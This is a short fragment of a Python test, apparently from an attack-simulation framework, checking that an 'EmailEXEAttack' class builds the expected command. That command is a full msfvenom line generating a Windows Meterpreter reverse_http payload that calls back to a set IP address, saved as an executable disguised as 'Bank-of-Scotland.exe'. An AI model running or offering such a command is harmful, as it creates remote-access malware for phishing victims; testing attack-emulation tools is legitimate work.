...
class TestEmailEXEAttack:
    def test_generate_exe_command(self, attack: EmailEXEAttack):
        ...
        expected_exe_command = f"msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.18.0.3 LPORT=80 -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Scotland.exe"
